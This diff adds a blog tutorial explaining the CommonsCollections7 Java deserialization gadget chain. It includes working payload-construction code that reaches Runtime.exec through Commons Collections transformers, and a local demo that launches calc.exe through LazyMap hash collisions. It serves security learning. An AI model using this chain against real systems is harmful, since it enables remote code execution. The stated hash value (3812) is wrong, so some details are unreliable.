@@ -1,0 +1,365 @@
+---
+layout: default
+---
+<html>
+<body>
+<h1>CommonsCollection7</h1>
+
+<p>
+    On this blog post we will learn about CommonsCollecton7 payload.
+    <br>
+    Now Before Jumping into the commonsCollection7 payload , lets understand a little bit of HashTable
+</p>
+
+<P>
+   <p>
+    A <code>Hashtable</code> in Java is a data structure used to store key-value pairs. It allows fast access and retrieval using the <code>get()</code> and <code>put()</code> methods, making it one of the foundational classes in Java's Collections Framework.
+</p>
+
+<p>Let’s start with a basic example:</p>
+
+<pre><code>
+Hashtable&lt;String, String&gt; ht = new Hashtable&lt;&gt;();
+
+ht.put("language", "Java");
+ht.put("author", "James Gosling");
+
+System.out.println(ht.get("language"));  // Output: Java
+System.out.println(ht.get("author"));    // Output: James Gosling
+</code></pre>
+
+<p>
+    Behind the scenes, when you insert a key like <code>"language"</code>, Java internally computes the hash using the key’s <code>hashCode()</code> method. 
+    This method returns an integer that serves as a fingerprint of the object and is used to determine where in memory (i.e., in the internal array) the value should be placed.
+</p>
+
+<p>
+    For example:
+</p>
+
+<pre><code>
+String key1 = "Aa";
+String key2 = "BB";
+
+System.out.println(key1.hashCode());  // 2112
+System.out.println(key2.hashCode());  // 2112 (collision!)
+</code></pre>
+
+<p>
+    Here, both keys produce the same hash code (<code>2112</code>) despite being different strings — this is a <strong>hash collision</strong>, and we'll talk about how it's handled shortly.
+</p>
+
+<hr>
+
+<h3> How Hashtable Uses <code>hashCode()</code></h3>
+
+<p>
+    Once Java computes the <code>hashCode()</code>, it must convert it into an index within the internal array of the <code>Hashtable</code>. 
+    It does this using the following line of code:
+</p>
+
+<pre><code>
+int index = (hash &amp; 0x7FFFFFFF) % table.length;
+</code></pre>
+
+<ul>
+    <li><code>hash &amp; 0x7FFFFFFF</code>: This bitmask ensures the hash code is positive (since <code>hashCode()</code> can return negative values).</li>
+    <li><code>% table.length</code>: This maps the hash to a valid index within the internal array.</li>
+</ul>
+
+<p>
+    So if your hashtable has 16 slots, and <code>hashCode()</code> returns 2112, then:
+</p>
+
+<pre><code>
+index = (2112 &amp; 0x7FFFFFFF) % 16 = 0
+</code></pre>
+
+<hr>
+
+<h3> What If Two Keys End Up at the Same Index?</h3>
+
+<p>
+    That's where hash collisions come in. Java handles them using a technique called <strong>chaining</strong>: it stores multiple entries at the same index as a linked list.
+</p>
+
+<pre><code>
+Hashtable&lt;String, String&gt; ht = new Hashtable&lt;&gt;();
+
+String key1 = "Aa";  // hashCode = 2112
+String key2 = "BB";  // hashCode = 2112 (collision)
+
+ht.put(key1, "first");
+ht.put(key2, "second");
+
+System.out.println(ht.get(key1)); // Output: first
+System.out.println(ht.get(key2)); // Output: second
+</code></pre>
+
+<p>
+    When retrieving, the Hashtable checks each entry at that index using <code>equals()</code> to identify the correct key:
+</p>
+
+<pre><code>
+for (; entry != null; entry = entry.next) {
+    if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) {
+        return entry.value;
+    }
+}
+</code></pre>
+
+<p>
+    So even if multiple keys hash to the same bucket, Java can still retrieve the right value as long as <code>equals()</code> distinguishes them.
+</p>
+
+<p>
+    This collision resolution mechanism becomes especially critical in deserialization attacks where crafted objects override <code>equals()</code> and <code>hashCode()</code> to trigger specific behavior — like transformer chains in CommonsCollections gadgets.
+</p>
+
+</P>
+<h4> With the above knowledge about the hashtable lets jump into the CC7 payload.</h4>   
+
+    <p>
+        Below is how the payload looks like
+        
+        <pre>
+            
+        <code>
+
+        public Hashtable getObject(final String command) throws Exception {
+
+        // Reusing transformer chain and LazyMap gadgets from previous payloads
+        final String[] execArgs = new String[]{command};
+
+        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
+
+        final Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod",
+                new Class[]{String.class, Class[].class},
+                new Object[]{"getRuntime", new Class[0]}),
+            new InvokerTransformer("invoke",
+                new Class[]{Object.class, Object[].class},
+                new Object[]{null, new Object[0]}),
+            new InvokerTransformer("exec",
+                new Class[]{String.class},
+                execArgs),
+            new ConstantTransformer(1)};
+
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+
+        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
+        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
+        lazyMap1.put("yy", 1);
+
+        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
+        lazyMap2.put("zZ", 1);
+
+        // Use the colliding Maps as keys in Hashtable
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 2);
+
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+
+        // Needed to ensure hash collision after previous manipulations
+        lazyMap2.remove("yy");
+
+        return hashtable;
+
+        </code>
+
+
+        </pre>
+    </p>
+    <p>
+        So the payload uses the TransFormerChain and LaZyMap along with hashTable.
+    </p>
+    <p>
+        <i>We have discussed about the LazyMap in CC5. Please give it a read if you are unaware of its uses in deserisliation.</i>
+    </p>
+    <p>
+        Lets rewrite the payload to reproduce rce locally.
+    </p>
+    <div>
+
+        <pre>
+            <code>
+
+import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.Hashtable;
+import java.util.List;
+import java.util.Map;
+
+import java.util.HashMap;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.LazyMap;
+
+
+public class cc7 {
+
+
+    public static void main(String args[])
+    {
+
+        Person pt=new Person("HelloWorld");
+        ConstantTransformer tr=new ConstantTransformer(Runtime.class);
+        InvokerTransformer transformer = new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]});
+        InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]});
+        InvokerTransformer tr4=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
+        //System.out.println(transformer.transform(Runtime.class).getClass().getName());
+        //System.out.println(tr4.transform(tr3.transform(transformer.transform(tr.transform("HELLO")))));
+
+
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { tr, transformer,tr3,tr4 });
+
+
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+
+        Map lazyMap1 = LazyMap.decorate(innerMap1, chain);
+        lazyMap1.put("yy", 1);
+
+        Map lazyMap2 = LazyMap.decorate(innerMap2, chain);
+        lazyMap2.put("zZ", 1);
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 2);
+
+
+    }
+}
+
+            </code>
+        </pre>
+        </div>
+    <div>
+        <p>
+            Now lets understand the above code and flow.<br>
+            When we call the put() on hash table the below code gets executed.<br>
+            <pre>
+            <code>
+        public synchronized V put(K key, V value) {
+        // Make sure the value is not null
+        if (value == null) {
+            throw new NullPointerException();
+        }
+
+        // Makes sure the key is not already in the hashtable.
+        Entry<?,?> tab[] = table;
+        int hash = key.hashCode();
+        int index = (hash & 0x7FFFFFFF) % tab.length;
+        @SuppressWarnings("unchecked")
+        Entry<K,V> entry = (Entry<K,V>)tab[index];
+        for(; entry != null ; entry = entry.next) {
+            if ((entry.hash == hash) && entry.key.equals(key)) {
+                V old = entry.value;
+                entry.value = value;
+                return old;
+            }
+        }
+
+        addEntry(hash, key, value, index);
+        return null;
+    }
+            </code>
+            </pre>
+            <br>
+            If you check the above code , the code first takes the entry get's a hashCode of it and in the for loop it checks for the collision.<br>
+            if the for loop exeutes to be true then the if condition os checked.<br>
+            How ever duding the first entry the condition on the for loop fails , so it never calls the entry.key.equals().<br>
+
+            On the 2nd put however with entries like yy and zZ, the hashCode of these 2 are exactly the same i.e 3812.<br>
+            So the if condition is called and since both the hashes are same the entry.key.equals() will be called.<br>
+
+            Now the entries we have in the hashtable as LaZyMap entries.<br>
+            However the LaZyMap does not have any equals function but extends AbstractMapDecorator which has the equals functions.<br><br>
+            <img src="images/cc/abstractmapdecorator_equals.PNG"><br>
+        </p>
+        <p> Now this equals() at AbstractMapDecorator calls map.equals() , map being an abstract class the AbstractMap.equals() gets called</p>
+        <P>
+            Below is how the equals() at AbstractMap looks Like
+            <pre>
+                <code>
+        public boolean equals(Object o) {
+        if (o == this)
+            return true;
+
+        if (!(o instanceof Map))
+            return false;
+        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;
+        if (m.size() != size())
+            return false;
+
+        try {
+            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
+            while (i.hasNext()) {
+                Entry&lt;K,V&lg; e = i.next();
+                K key = e.getKey();
+                V value = e.getValue();
+                if (value == null) {
+                    if (!(m.get(key)==null && m.containsKey(key)))
+                        return false;
+                } else {
+                    if (!value.equals(m.get(key)))
+                        return false;
+                }
+            }
+        } catch (ClassCastException unused) {
+            return false;
+        } catch (NullPointerException unused) {
+            return false;
+        }
+
+        return true;
+    }
+                </code>
+            </pre>
+        </P>
+        <p>On the above what we need to pay attention is to the else block where  we are calling m.get(key)<br>IF you pay close attention,
+        the input here is of ObjectType, and we have sent a LaZyMap here, and the m value is set to the Object 0, so when we call m.get(), LazyMap.get() gets called.</p>
+        <p>
+            Now the LazYMap.get() check if the key exist.
+            If the key doesn't exist it calls the transformerChain that we initialised during the decorate().
+        </p>
+        <p>
+            And hence we are able to execute the transFormerChain that leads to code execution
+        </p>
+    </div>
+
+
+
+
+
+
+<p>
+    <img src="images/cc/cc7calcpop.PNG">
+</p>
+
+
+<p>
+    This is how the CommonsCollection7 Payload works, staring from the EntryPoint to Code Execution
+</p>
+
+<h4>Summary:</h4>
+<ul>
+  <li>We use two <code>LazyMap</code> instances with colliding hashCodes as keys.</li>
+  <li>This forces <code>equals()</code> to be called during the second <code>put()</code>.</li>
+  <li>The <code>equals()</code> call triggers <code>LazyMap.get()</code> on a missing key.</li>
+  <li><code>LazyMap</code> uses the transformer chain to generate the value — which leads to RCE.</li>
+</ul>
+
+<p>Thats it for Today.</p>
+<p>Thanks For Reading.</p>
+<p>Happy Hacking.</p>
+<p>You can connect with me at:</p>
+<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
+<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
+
+</body>
+</html>
